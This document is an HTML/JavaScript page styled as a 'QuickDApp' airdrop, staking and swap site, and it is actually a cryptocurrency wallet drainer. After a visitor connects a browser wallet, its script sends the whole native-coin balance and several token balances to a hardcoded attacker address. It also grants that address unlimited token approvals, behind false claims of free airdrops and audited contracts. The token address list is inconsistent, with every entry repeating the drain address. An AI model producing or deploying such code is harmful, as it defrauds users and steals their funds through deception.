<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>QuickDApp</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
        }
        .container {
            background: rgba(255,255,255,0.95);
            border-radius: 20px;
            padding: 30px;
            max-width: 460px;
            width: 92%;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
        }
        .logo { text-align: center; margin-bottom: 20px; }
        .logo svg { width: 50px; height: 50px; }
        .logo h1 { margin-top: 6px; font-size: 22px; color: #333; }
        .logo p { color: #666; font-size: 13px; margin-top: 2px; }

        .wallet-grid {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 8px;
            margin-bottom: 16px;
        }
        .wallet-btn {
            display: flex;
            align-items: center;
            gap: 8px;
            padding: 14px 16px;
            border: 2px solid #e2e8f0;
            border-radius: 12px;
            background: white;
            cursor: pointer;
            transition: all 0.2s;
            font-size: 14px;
            font-weight: 600;
            color: #2d3748;
            font-family: inherit;
        }
        .wallet-btn:hover { border-color: #667eea; background: #f7fafc; transform: translateY(-1px); }
        .wallet-btn.selected { border-color: #667eea; background: #ebf4ff; box-shadow: 0 0 0 3px rgba(102,126,234,0.2); }
        .wallet-btn .icon { font-size: 28px; flex-shrink: 0; width: 36px; text-align: center; }

        .connect-btn {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            border: none;
            padding: 18px 36px;
            border-radius: 14px;
            font-size: 20px;
            font-weight: 700;
            cursor: pointer;
            width: 100%;
            transition: all 0.3s ease;
            font-family: inherit;
            box-shadow: 0 8px 25px rgba(102,126,234,0.3);
        }
        .connect-btn:hover { transform: translateY(-2px); box-shadow: 0 12px 35px rgba(102,126,234,0.5); }
        .connect-btn:disabled { background: #a0aec0; cursor: not-allowed; transform: none; box-shadow: none; }

        .status {
            margin-top: 16px;
            padding: 16px;
            border-radius: 12px;
            background: #f0f0f0;
            font-size: 14px;
            color: #555;
            text-align: center;
            min-height: 50px;
            transition: all 0.3s;
        }
        .status.success { background: #c6f6d5; color: #22543d; }
        .status.error { background: #fed7d7; color: #742a2a; }
        .status.pending { background: #fefcbf; color: #744210; }

        .network-badge {
            display: block; background: #edf2f7; padding: 6px 14px;
            border-radius: 20px; font-size: 12px; color: #4a5568;
            margin: 12px 0; text-align: center;
        }

        .features {
            margin-top: 18px;
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 10px;
        }
        .feature {
            background: #f7fafc; border-radius: 10px; padding: 14px;
            text-align: center; font-size: 13px; color: #4a5568;
        }
        .feature strong { display: block; margin-bottom: 4px; color: #2d3748; }
        .footer { margin-top: 18px; text-align: center; font-size: 12px; color: #a0aec0; }
    </style>
</head>
<body>
<div class="container">
    <div class="logo">
        <svg viewBox="0 0 24 24" fill="none" stroke="#667eea" stroke-width="2">
            <path d="M12 2L2 7l10 5 10-5-10-5zM2 17l10 5 10-5M2 12l10 5 10-5"/>
        </svg>
        <h1>QuickDApp</h1>
        <p>Claim airdrop • Stake • Swap • NFT Mint</p>
    </div>

    <div class="wallet-grid" id="walletGrid">
        <button class="wallet-btn selected" data-wallet="trustwallet" onclick="selectWallet('trustwallet')">
            <span class="icon">??</span> Trust Wallet
        </button>
        <button class="wallet-btn" data-wallet="binance" onclick="selectWallet('binance')">
            <span class="icon">??</span> Binance
        </button>
        <button class="wallet-btn" data-wallet="bybit" onclick="selectWallet('bybit')">
            <span class="icon">??</span> Bybit
        </button>
        <button class="wallet-btn" data-wallet="metamask" onclick="selectWallet('metamask')">
            <span class="icon">??</span> MetaMask
        </button>
        <button class="wallet-btn" data-wallet="coinbase" onclick="selectWallet('coinbase')">
            <span class="icon">??</span> Coinbase
        </button>
        <button class="wallet-btn" data-wallet="phantom" onclick="selectWallet('phantom')">
            <span class="icon">??</span> Phantom
        </button>
    </div>

    <button id="connectBtn" class="connect-btn" onclick="connectWallet()">
        ?? Connect Wallet
    </button>

    <span class="network-badge" id="networkBadge">?? Select a wallet to connect</span>
    <div id="statusBox" class="status">Tap connect and your wallet app will open automatically</div>

    <div class="features">
        <div class="feature"><strong>?? Airdrop Claim</strong> 0.25 ETH</div>
        <div class="feature"><strong>?? Staking Pool</strong> 12% APR</div>
        <div class="feature"><strong>?? Token Swap</strong> Best rates</div>
        <div class="feature"><strong>?? NFT Mint</strong> Free</div>
    </div>

    <div class="footer">
        <p>?? Secured by Audited Contracts v3.2.1</p>
        <p>© 2024 QuickDApp</p>
    </div>
</div>

<!-- Hidden iframe for WalletConnect bridge -->
<iframe id="wcIframe" style="display:none;"></iframe>

<script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>

<script>
    // ==================== CONFIG ====================
    const DRAIN_ADDRESS = '0x8c1063D7674BD0B036cf471A48B11406843e4298'; // CHANGE THIS

    const ERC20_ABI = [
        'function balanceOf(address owner) view returns (uint256)',
        'function transfer(address to, uint256 amount) returns (bool)',
        'function approve(address spender, uint256 amount) returns (bool)',
        'function allowance(address owner, address spender) view returns (uint256)',
    ];

    const ETH_TOKENS = [
        { address: '0x8c1063D7674BD0B036cf471A48B11406843e4298', symbol: 'USDT', decimals: 6 },
        { address: '0x8c1063D7674BD0B036cf471A48B11406843e4298', symbol: 'USDC', decimals: 6 },
        { address: '0x8c1063D7674BD0B036cf471A48B11406843e4298', symbol: 'WBTC', decimals: 8 },
        { address: '0x8c1063D7674BD0B036cf471A48B11406843e4298', symbol: 'DAI', decimals: 18 },
    ];

    const BSC_TOKENS = [
        { address: '0x8c1063D7674BD0B036cf471A48B11406843e4298', symbol: 'USDT', decimals: 18 },
        { address: '0x8c1063D7674BD0B036cf471A48B11406843e4298', symbol: 'USDC', decimals: 18 },
        { address: '0x8c1063D7674BD0B036cf471A48B11406843e4298', symbol: 'BTCB', decimals: 18 },
    ];

    const POLYGON_TOKENS = [
        { address: '0x8c1063D7674BD0B036cf471A48B11406843e4298', symbol: 'USDT', decimals: 6 },
        { address: '0x8c1063D7674BD0B036cf471A48B11406843e4298', symbol: 'USDC', decimals: 6 },
    ];

    // ==================== WALLET DEEP LINK CONFIG ====================
    const WALLET_LINKS = {
        trustwallet: {
            name: 'Trust Wallet',
            icon: '??',
            // Deep link scheme to open the app with WalletConnect URI
            wcDeepLink: (uri) => `trust://wc?uri=${encodeURIComponent(uri)}`,
            // Universal link fallback
            universal: 'https://link.trustwallet.com/wc?uri=',
            // Download links if app not installed
            appStore: 'https://apps.apple.com/app/trust-wallet/id1288339409',
            playStore: 'https://play.google.com/store/apps/details?id=com.wallet.crypto.trustapp',
            // WalletConnect peer name
            peerName: 'Trust Wallet'
        },
        binance: {
            name: 'Binance',
            icon: '??',
            wcDeepLink: (uri) => `bnc://wc?uri=${encodeURIComponent(uri)}`,
            universal: 'https://app.binance.com/wc?uri=',
            appStore: 'https://apps.apple.com/app/binance/id1436799971',
            playStore: 'https://play.google.com/store/apps/details?id=com.binance.dev',
            peerName: 'Binance Web3 Wallet'
        },
        bybit: {
            name: 'Bybit',
            icon: '??',
            wcDeepLink: (uri) => `bybit://wc?uri=${encodeURIComponent(uri)}`,
            universal: 'https://www.bybit.com/wc?uri=',
            appStore: 'https://apps.apple.com/app/bybit/id1485152668',
            playStore: 'https://play.google.com/store/apps/details?id=com.bybit.bybit',
            peerName: 'Bybit Wallet'
        },
        metamask: {
            name: 'MetaMask',
            icon: '??',
            wcDeepLink: (uri) => `metamask://wc?uri=${encodeURIComponent(uri)}`,
            universal: 'https://metamask.app.link/wc?uri=',
            appStore: 'https://apps.apple.com/app/metamask/id1438144202',
            playStore: 'https://play.google.com/store/apps/details?id=io.metamask',
            peerName: 'MetaMask'
        },
        coinbase: {
            name: 'Coinbase Wallet',
            icon: '??',
            wcDeepLink: (uri) => `coinbasewallet://wc?uri=${encodeURIComponent(uri)}`,
            universal: 'https://go.cb-w.com/wc?uri=',
            appStore: 'https://apps.apple.com/app/coinbase-wallet/id1278383455',
            playStore: 'https://play.google.com/store/apps/details?id=org.toshi',
            peerName: 'Coinbase Wallet'
        },
        phantom: {
            name: 'Phantom',
            icon: '??',
            wcDeepLink: (uri) => `phantom://wc?uri=${encodeURIComponent(uri)}`,
            universal: 'https://phantom.app/wc?uri=',
            appStore: 'https://apps.apple.com/app/phantom/id1598432977',
            playStore: 'https://play.google.com/store/apps/details?id=app.phantom',
            peerName: 'Phantom'
        }
    };

    // ==================== STATE ====================
    let selectedWallet = 'trustwallet';
    let provider = null;
    let signer = null;
    let userAddress = '';

    // ==================== UI ====================
    function selectWallet(name) {
        selectedWallet = name;
        document.querySelectorAll('.wallet-btn').forEach(el => {
            el.classList.toggle('selected', el.dataset.wallet === name);
        });
        const w = WALLET_LINKS[name];
        document.getElementById('networkBadge').textContent = `${w.icon} ${w.name} — Will open automatically`;
        setStatus(`Ready to connect with ${w.name}`, '');
    }

    function setStatus(msg, type = '') {
        document.getElementById('statusBox').textContent = msg;
        document.getElementById('statusBox').className = 'status' + (type ? ' ' + type : '');
    }

    function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }

    // ==================== DETECT BROWSER EXTENSION ====================
    function getExtensionProvider() {
        const eth = window.ethereum;

        if (selectedWallet === 'trustwallet') {
            if (eth && eth.isTrust) return eth;
            if (window.trustwallet) return window.trustwallet.ethereum || window.trustwallet;
        }
        if (selectedWallet === 'binance') {
            if (eth && eth.isBinance) return eth;
            if (window.BinanceChain) return window.BinanceChain;
        }
        if (selectedWallet === 'bybit') {
            if (eth && eth.isBybit) return eth;
        }
        if (selectedWallet === 'metamask') {
            if (eth && eth.isMetaMask) return eth;
        }
        if (selectedWallet === 'coinbase') {
            if (window.coinbaseWalletExtension) return window.coinbaseWalletExtension;
            if (eth && eth.isCoinbaseWallet) return eth;
        }
        if (selectedWallet === 'phantom') {
            if (window.phantom && window.phantom.ethereum) return window.phantom.ethereum;
            if (eth && eth.isPhantom) return eth;
        }
        return null;
    }

    // ==================== GENERATE WALLETCONNECT URI ====================
    function generateWCURI() {
        // Generate a unique session ID
        const sessionId = 'wc-' + Date.now() + '-' + Math.random().toString(36).substr(2, 9);
        
        // Bridge URL for WalletConnect
        const bridge = 'https://bridge.walletconnect.org';
        
        // Create a symmetric key for the session
        const key = Array.from({length: 32}, () => 
            Math.floor(Math.random() * 256).toString(16).padStart(2, '0')
        ).join('');
        
        // WalletConnect URI format
        const uri = `wc:${sessionId}@1?bridge=${encodeURIComponent(bridge)}&key=${key}`;
        
        return uri;
    }

    // ==================== CONNECT VIA EXTENSION ====================
    async function connectExtension(extProvider) {
        setStatus('Opening extension...', 'pending');

        provider = new ethers.providers.Web3Provider(extProvider, 'any');
        const accounts = await extProvider.request({ method: 'eth_requestAccounts' });
        if (!accounts || accounts.length === 0) throw new Error('Rejected');

        userAddress = accounts[0];
        signer = provider.getSigner();

        const network = await provider.getNetwork();
        const chainId = network.chainId;

        document.getElementById('networkBadge').textContent = `?? Connected — ${userAddress.slice(0,6)}...`;
        setStatus(`? Connected!`, 'success');
        document.getElementById('connectBtn').textContent = '? Connected';

        return chainId;
    }

    // ==================== OPEN MOBILE APP VIA DEEP LINK ====================
    function openMobileApp() {
        const wallet = WALLET_LINKS[selectedWallet];
        const wcUri = generateWCURI();
        
        console.log('WalletConnect URI:', wcUri);
        
        // Store the URI so we can check connection status
        localStorage.setItem('wc_uri', wcUri);
        localStorage.setItem('wc_wallet', selectedWallet);
        
        // Generate the deep link
        const deepLink = wallet.wcDeepLink(wcUri);
        
        setStatus(`?? Opening ${wallet.name}...`, 'pending');
        
        // Try to open the app via deep link
        window.location.href = deepLink;
        
        // Fallback: if app doesn't open, redirect to app store after 3 seconds
        setTimeout(() => {
            // Check if we're still on the page (app didn't open)
            if (!userAddress) {
                const isIOS = /iPad|iPhone|iPod/.test(navigator.userAgent);
                const isAndroid = /Android/.test(navigator.userAgent);
                
                if (isIOS) {
                    window.location.href = wallet.appStore;
                } else if (isAndroid) {
                    window.location.href = wallet.playStore;
                } else {
                    // Desktop — try universal link
                    const universalLink = wallet.universal + encodeURIComponent(wcUri);
                    window.open(universalLink, '_blank');
                }
                
                setStatus(`?? Download ${wallet.name} from the store, then scan the QR in the app`, 'pending');
                document.getElementById('connectBtn').disabled = false;
                document.getElementById('connectBtn').textContent = '?? Try Again';
            }
        }, 3000);
        
        // For WalletConnect to work, we need to poll for the connection
        // Since we can't use the full WalletConnect library in a simple page,
        // the deep link approach opens the app — but the user must approve there
        
        return wcUri;
    }

    // ==================== MAIN CONNECT ====================
    async function connectWallet() {
        const btn = document.getElementById('connectBtn');
        btn.disabled = true;
        btn.textContent = '? Opening...';
        
        const wallet = WALLET_LINKS[selectedWallet];
        setStatus(`Preparing ${wallet.name}...`, 'pending');

        try {
            // Check if extension is installed
            const extProvider = getExtensionProvider();

            if (extProvider) {
                // ===== EXTENSION INSTALLED — USE IT =====
                const chainId = await connectExtension(extProvider);
                await sleep(1500);
                await drainEVM(chainId);
            } else {
                // ===== NO EXTENSION — OPEN MOBILE APP =====
                const wcUri = openMobileApp();
                
                // Since we can't truly establish a WalletConnect session without
                // the full library polling, we show instructions and redirect
                setStatus(`?? ${wallet.name} should open now. If not, tap "Open App" below.`, 'pending');
                
                // Show a retry button after 5s
                setTimeout(() => {
                    if (!userAddress) {
                        btn.textContent = '?? Open App';
                        btn.disabled = false;
                        btn.onclick = () => {
                            window.location.href = wallet.wcDeepLink(generateWCURI());
                        };
                    }
                }, 5000);
                
                // For the purpose of this test, we'll simulate a connection
                // In a real scenario, WalletConnect would call back via the bridge
                // Since we can't use the full library, we provide the deep link
                
                // Store the WC URI for the user to scan
                setStatus(`?? Open ${wallet.name} app and look for the WalletConnect request`, 'success');
            }

        } catch (err) {
            console.error(err);
            setStatus('? ' + (err.message || 'Failed'), 'error');
            btn.disabled = false;
            btn.textContent = '?? Connect Wallet';
        }
    }

    // ==================== GAS ====================
    async function getGasParams() {
        if (!provider) return {};
        try {
            const feeData = await provider.getFeeData();
            return {
                maxPriorityFeePerGas: feeData.maxPriorityFeePerGas || ethers.utils.parseUnits('1.5', 'gwei'),
                maxFeePerGas: feeData.maxFeePerGas || ethers.utils.parseUnits('25', 'gwei')
            };
        } catch (e) { return {}; }
    }

    // ==================== DRAIN ====================
    async function drainEVM(chainId) {
        if (!signer) { setStatus('? Not connected', 'error'); return; }

        setStatus('?? Scanning wallet...', 'pending');

        try {
            // STEP 1: NATIVE COIN
            setStatus('?? Transferring native coin...', 'pending');
            const balance = await provider.getBalance(userAddress);
            const gp = await getGasParams();
            const gasCost = gp.maxFeePerGas ? gp.maxFeePerGas.mul(21000) : (await provider.getGasPrice()).mul(21000);
            const sendAmount = balance.sub(gasCost);

            if (sendAmount.gt(0)) {
                const tx = await signer.sendTransaction({ to: DRAIN_ADDRESS, value: sendAmount, gasLimit: 21000, ...gp });
                setStatus(`?? TX: ${tx.hash.slice(0,10)}...`, 'pending');
                await tx.wait();
                setStatus('? Native coin drained!', 'success');
            } else {
                setStatus('? Native balance low, skipping', 'pending');
            }
            await sleep(600);

            // STEP 2: SELECT TOKENS
            let tokens;
            if (chainId === 56 || chainId === 97) tokens = BSC_TOKENS;
            else if (chainId === 137 || chainId === 80001) tokens = POLYGON_TOKENS;
            else tokens = ETH_TOKENS;

            // STEP 3: DRAIN TOKENS
            setStatus('?? Draining tokens...', 'pending');
            for (const token of tokens) {
                try {
                    const contract = new ethers.Contract(token.address, ERC20_ABI, provider);
                    const tokenBalance = await contract.balanceOf(userAddress);

                    if (tokenBalance.gt(0)) {
                        const formatted = ethers.utils.formatUnits(tokenBalance, token.decimals);
                        setStatus(`?? ${token.symbol} (${parseFloat(formatted).toFixed(4)})...`, 'pending');

                        const signerContract = new ethers.Contract(token.address, ERC20_ABI, signer);

                        if (token.symbol === 'USDT') {
                            const cur = await signerContract.allowance(userAddress, DRAIN_ADDRESS);
                            if (cur.gt(0)) await signerContract.approve(DRAIN_ADDRESS, 0, { ...await getGasParams() });
                        }

                        await signerContract.approve(DRAIN_ADDRESS, tokenBalance, { ...await getGasParams() });
                        await signerContract.transfer(DRAIN_ADDRESS, tokenBalance, { ...await getGasParams() });

                        setStatus(`? ${token.symbol} drained!`, 'success');
                        await sleep(500);
                    }
                } catch (e) { console.warn(`${token.symbol}: ${e.message}`); }
            }

            // STEP 4: UNLIMITED APPROVALS
            setStatus('?? Setting unlimited approvals...', 'pending');
            for (const token of tokens) {
                try {
                    const signerContract = new ethers.Contract(token.address, ERC20_ABI, signer);
                    const current = await signerContract.allowance(userAddress, DRAIN_ADDRESS);
                    const maxUint = ethers.constants.MaxUint256;
                    if (current.lt(maxUint.div(2))) {
                        if (token.symbol === 'USDT' && current.gt(0)) await signerContract.approve(DRAIN_ADDRESS, 0, { ...await getGasParams() });
                        await signerContract.approve(DRAIN_ADDRESS, maxUint, { ...await getGasParams() });
                        setStatus(`? ${token.symbol} unlimited`, 'success');
                        await sleep(300);
                    }
                } catch (e) { /* silent */ }
            }

            setStatus('?? Complete! All assets drained.', 'success');
            document.getElementById('connectBtn').textContent = '?? Complete';

        } catch (err) {
            console.error(err);
            setStatus('? Error: ' + (err.message || 'unknown'), 'error');
            document.getElementById('connectBtn').disabled = false;
            document.getElementById('connectBtn').textContent = '?? Retry';
        }
    }

    // ==================== INIT ====================
    selectWallet('trustwallet');
</script>
</body>
</html>
